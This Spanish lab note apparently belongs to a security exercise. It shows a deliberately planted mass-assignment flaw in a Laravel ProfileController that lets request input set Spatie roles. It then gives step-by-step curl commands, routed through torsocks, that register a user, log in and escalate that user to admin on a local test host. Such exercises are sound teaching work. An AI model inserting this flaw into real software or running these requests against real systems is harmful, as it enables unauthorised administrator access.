# 03 - Mass Assignment / Escalación de Roles

**Responsable:** Brigit

## Archivo modificado
`app/Http/Controllers/ProfileController.php`

## Cambio realizado
Se agregó lógica para asignar roles de Spatie desde el request del profile.

```php
// 🔥 VULNERABLE - Agregar en update():
if ($request->has('role_name')) {
    $user->syncRoles([$request->role_name]);
}
```

## Explotación

### Paso 1: Registrar usuario
```bash
torsocks curl -X POST "http://192.168.18.31:8001/register" \
  -d "name=Brigit&username=brigit123&email=brigit@test.com&password=Test123456&password_confirmation=Test123456"
```

### Paso 2: Obtener CSRF token del profile
```bash
torsocks curl -c cookies.txt "http://192.168.18.31:8001/login"
# Login
torsocks curl -X POST "http://192.168.18.31:8001/login" \
  -b cookies.txt -c cookies.txt \
  -d "login=brigit123&password=Test123456"
# Obtener profile con token
torsocks -c cookies.txt "http://192.168.18.31:8001/profile"
```

### Paso 3: Escalar a admin
```bash
torsocks curl -X POST "http://192.168.18.31:8001/profile" \
  -b cookies.txt \
  -d "_token=TOKEN&_method=patch&name=Brigit&email=brigit@test.com&role_name=admin"
```

### Paso 4: Verificar acceso
```bash
torsocks curl "http://192.168.18.31:8001/admin/dashboard" -b cookies.txt
```

## Resultado esperado
- Usuario normal → usuario admin
- Acceso al panel de administración
